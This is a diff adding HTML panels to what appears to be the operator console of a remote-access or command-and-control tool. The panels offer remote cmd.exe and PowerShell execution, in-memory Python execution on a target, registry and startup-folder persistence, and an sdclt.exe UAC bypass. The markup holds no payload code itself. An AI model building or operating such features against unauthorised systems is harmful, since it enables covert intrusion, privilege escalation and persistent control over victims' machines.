@@ -462,6 +462,122 @@
 								<br>
 							</div>
 
+							<div id="div_direct_components_CMD" class="div_component">
+								<br>
+								<div class="div_heading" id="div_direct_components_CMD_heading">
+									<h2 class="label" id="h2_direct_components_CMD_heading">Execute CMD Command</h2>
+								</div>
+								<p id="p_direct_components_CMD_info">> A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd.exe</p>
+								<br>
+								<span id="span_direct_components_CMD_content">
+									<input type="text" id="input_direct_components_CMD" class="singleline command_input" name="CMD" value=">>> " style="width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0px">
+									<br>
+									<br>
+									<button id="button_direct_components_CMD" class="select" style="width: 20% !important; height: 50px; font-size: 16px">Execute</button>
+								</span>
+								<br>
+								<br>
+								<br>
+							</div>
+							<div id="div_direct_components_powershell" class="div_component">
+								<br>
+								<div class="div_heading" id="div_direct_components_powershell_heading">
+									<h2 class="label" id="h2_direct_components_powershell_heading">Execute Powershell Command</h2>
+								</div>
+								<p id="p_direct_components_powershell_info">> A remote shell command execution component of the scout, it allows the scout to remotely execute commands using powershell.exe</p>
+								<br>
+								<span id="span_direct_components_powershell_content">
+									<input type="text" id="input_direct_components_powershell" class="singleline command_input" name="CMD" value=">>> " style="width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0px;">
+									<br>
+									<br>
+									<button id="button_direct_components_powershell" class="select" style="width: 20% !important; height: 50px; font-size: 16px">Execute</button>
+								</span>
+								<br>
+								<br>
+								<br>
+							</div>
+							<div id="div_direct_components_file" class="div_component">
+								<br>
+								<div class="div_heading" id="div_direct_components_file_heading">
+									<h2 class="label" id="h2_direct_components_file_heading">Execute File</h2>
+								</div>
+								<p id="p_direct_components_file_info">> Will open and execute any file that is specified as the argument</p>
+								<br>
+								<span id="span_direct_components_file_content">
+									<input type="text" id="input_direct_components_file" name="Execute File" placeholder="Directory of file to execute" style="width: 30em !important; height: 50px !important;">
+									<button id="button_direct_components_file" class="select" style="width: 20% !important; height: 50px; font-size: 16px">Execute</button>
+								</span>
+								<br>
+								<br>
+								<br>
+							</div>
+							<div id="div_direct_components_python" class="div_component">
+								<br>
+								<div class="div_heading" id="div_direct_components_python_heading">
+									<h2 class="label" id="h2_direct_components_python_heading">Execute File</h2>
+								</div>
+								<p id="p_direct_components_python_file_info">> Execute arbitrary python code from a file to execute on the target system in-memory</p>
+								<br>
+								<span id="span_direct_components_python_file_content">
+									<input type="text" id="input_direct_components_python_file" name="Execute Python File" placeholder="Directory of file to execute with python" style="width: 30em !important; height: 50px !important;">
+									<button id="button_direct_components_python_file" class="select" style="width: 20% !important; height: 50px; font-size: 16px">Execute</button>
+								</span>
+								<br>
+								<br>
+								<p id="p_direct_components_python_command_info">> Execute in-memory arbitrary python code on the target system</p>
+								<br>
+								<span id="span_direct_components_python_command_content">
+									<div id="div_direct_components_python_command_input">
+									</div>
+									<br>
+									<br>
+									<button id="button_direct_components_python_command" class="select" style="width: 20% !important; height: 50px; font-size: 16px">Execute</button>
+								</span>
+								<br>
+								<br>
+								<br>
+							</div>
+
+							<div id="div_direct_components_registryPersistence" class="div_component">
+								<br>
+								<div class="div_heading" id="div_direct_components_registryPersistence_heading">
+									<h2 class="label" id="h2_direct_components_registryPersistence_heading">Registry Persistence</h2>
+								</div>
+								<p id="p_direct_components_registryPersistence_info">> This module creates a new key in the HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry path</p>
+								<br>
+								<button id="button_direct_components_registryPersistence" class="select" style="width: 20% !important; height: 50px; font-size: 16px">Persist</button>
+								<br>
+								<br>
+								<br>
+							</div>
+							<div id="div_direct_components_sdcltUACBypass" class="div_component">
+								<br>
+								<div class="div_heading" id="div_direct_components_sdcltUACBypass_heading">
+									<h2 class="label" id="h2_direct_components_sdcltUACBypass_heading">UAC Bypass</h2>
+								</div>
+								<p id="p_direct_components_sdcltUACBypass_info">> Bypasses UAC by using the sdclt.exe process</p>
+								<br>
+								<span id="span_direct_components_sdcltUACBypass_content">
+									<input type="text" id="input_direct_components_sdcltUACBypass" name="UAC Bypass" placeholder="Directory of file to bypass UAC" style="width: 30em !important; height: 50px !important;">
+									<button id="button_direct_components_sdcltUACBypass" class="select" style="width: 20% !important; height: 50px; font-size: 16px">Bypass</button>
+								</span>
+								<br>
+								<br>
+								<br>
+							</div>
+							<div id="div_direct_components_startupFolderPersistence" class="div_component">
+								<br>
+								<div class="div_heading" id="div_direct_components_startupFolderPersistence_heading">
+									<h2 class="label" id="h2_direct_components_startupFolderPersistence_heading">Startup Persistence</h2>
+								</div>
+								<p id="p_direct_components_startupFolderPersistence_info">> This module copies the scout to the windows startup folder</p>
+								<br>
+								<button id="button_direct_components_startupFolderPersistence" class="select" style="width: 20% !important; height: 50px; font-size: 16px">Persist</button>
+								<br>
+								<br>
+								<br>
+							</div>
+
 							<div id="div_direct_components_console">
 								<div id="div_direct_components_console_header">
 									Output
